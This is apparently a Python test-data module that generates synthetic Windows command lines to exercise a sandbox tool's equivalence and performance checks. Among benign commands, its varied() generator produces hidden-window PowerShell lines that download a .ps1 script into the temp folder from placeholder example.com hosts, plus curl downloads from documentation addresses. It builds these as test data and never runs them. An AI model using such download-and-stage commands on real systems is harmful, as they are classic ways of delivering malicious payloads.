"""Synthetic sandbox command lines for equivalence and performance tests.

Every generator is deterministic for a given seed. Hosts are reserved names and documentation
addresses; hashes and base64 blobs are random characters, not data from real samples.
"""

from __future__ import annotations

import random

FRAGMENTS = [
    'C:\\Windows\\System32\\cmd.exe /c "echo hello world"',
    "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\script.ps1",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer --lang=en-US",
    "rundll32.exe C:\\Windows\\system32\\shell32.dll,Control_RunDLL",
    'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion" /v ProgramFilesDir',
    "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe Get-ChildItem -Path C:\\Temp -Recurse",
    "svchost.exe -k netsvcs -p -s Schedule",
    'msiexec.exe /i "C:\\Users\\admin\\Downloads\\setup.msi" /qn',
    "C:\\Windows\\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding",
    "notepad.exe C:\\Users\\admin\\Documents\\report.txt",
    "wmic process where \"name='notepad.exe'\" get ProcessId,CommandLine",
    "conhost.exe 0xffffffff -ForceV1",
    "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
    '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\a\\a.docm" /o ""',
    "certutil.exe -hashfile C:\\Users\\Public\\a.bin SHA256",
    "tasklist /v /fo csv",
    "ping -n 1 www.example.com",
    "python.exe -m pip install --upgrade requests",
    "git.exe -c core.quotepath=false log --oneline -n 20",
    "taskhostw.exe /RuntimeWide",
]


def _filled(fragment: object, count: int, size: int) -> list[str]:
    lines = []
    for _ in range(count):
        parts: list[str] = []
        total = 0
        while total < size:
            text = fragment() if callable(fragment) else str(fragment)
            parts.append(text)
            total += len(text) + 1
        lines.append(" ".join(parts)[:size])
    return lines


def normal(count: int, size: int = 8192, seed: int = 1) -> list[str]:
    """Long lines of everyday commands, which repeat a lot."""
    rnd = random.Random(seed)  # noqa: S311 (reproducible test data)
    return _filled(lambda: rnd.choice(FRAGMENTS), count, size)


def varied(count: int, size: int = 8192, seed: int = 3) -> list[str]:
    """Long lines with fresh paths, GUIDs, URLs, hashes and base64 in every fragment."""
    rnd = random.Random(seed)  # noqa: S311 (reproducible test data)

    def word() -> str:
        return "".join(rnd.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(rnd.randint(3, 12)))

    def fragment() -> str:
        kind = rnd.randrange(12)
        if kind == 0:
            return f'"C:\\Users\\{word()}\\AppData\\Local\\Temp\\{word()}.exe" /S /D={word()}'
        if kind == 1:
            return (
                f'powershell.exe -NoP -W Hidden -C "Invoke-WebRequest -Uri https://{word()}.example.com/'
                f'{word()}/{word()}.ps1 -OutFile $env:TEMP\\{word()}.ps1"'
            )
        if kind == 2:
            a, b, c, d, e = (rnd.getrandbits(n) for n in (32, 16, 16, 16, 48))
            return f"{{{a:08x}-{b:04x}-{c:04x}-{d:04x}-{e:012x}}}"
        if kind == 3:
            return f"certutil -hashfile C:\\data\\{word()}.bin SHA256 {rnd.getrandbits(256):064x}"
        if kind == 4:
            return f'reg add "HKCU\\Software\\{word()}\\{word()}" /v {word()} /t REG_SZ /d "{word()}" /f'
        if kind == 5:
            return f"rundll32.exe C:\\Windows\\{word()}.dll,{word().capitalize()}Entry {rnd.randint(0, 999)}"
        if kind == 6:
            alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
            return "".join(rnd.choice(alphabet) for _ in range(rnd.randint(40, 200)))
        if kind == 7:
            return f"cmd.exe /c copy C:\\{word()}\\{word()}.txt D:\\backup\\{word()}.txt"
        if kind == 8:
            return f"schtasks /query /tn \\Microsoft\\Windows\\{word()}\\{word()} /fo LIST /v"
        if kind == 9:
            host = f"198.51.100.{rnd.randint(1, 254)}:{rnd.randint(1024, 65535)}"
            return f"curl.exe -s -o {word()}.zip http://{host}/{word()}/{word()}.zip"
        if kind == 10:
            return f"net use \\\\{word()}\\{word()}$ /user:{word()}\\{word()}"
        return f"java.exe -Xmx2g -cp lib/{word()}.jar;lib/{word()}.jar com.{word()}.Main --{word()}={word()}"

    return _filled(fragment, count, size)


def printable(count: int, size: int = 8192, seed: int = 2) -> list[str]:
    """Random printable ASCII: quotes, carets, "&" and "|" everywhere."""
    rnd = random.Random(seed)  # noqa: S311 (reproducible test data)
    alphabet = [chr(c) for c in range(0x20, 0x7F)]
    return ["".join(rnd.choices(alphabet, k=size)) for _ in range(count)]


def short(count: int, seed: int = 4) -> list[str]:
    """Distinct command lines of one or two commands, as a sandbox reports them."""
    rnd = random.Random(seed)  # noqa: S311 (reproducible test data)
    pieces = [p for line in varied(count // 30 + 1, seed=seed) for p in line.split(" C:") if p]
    lines: dict[str, None] = {}
    while len(lines) < count:
        line = rnd.choice(FRAGMENTS if rnd.random() < 0.3 else pieces)[:400]
        if rnd.random() < 0.3:
            line += rnd.choice([" & ", " && ", " || ", " | "]) + rnd.choice(FRAGMENTS)
        lines[line] = None
    return list(lines)
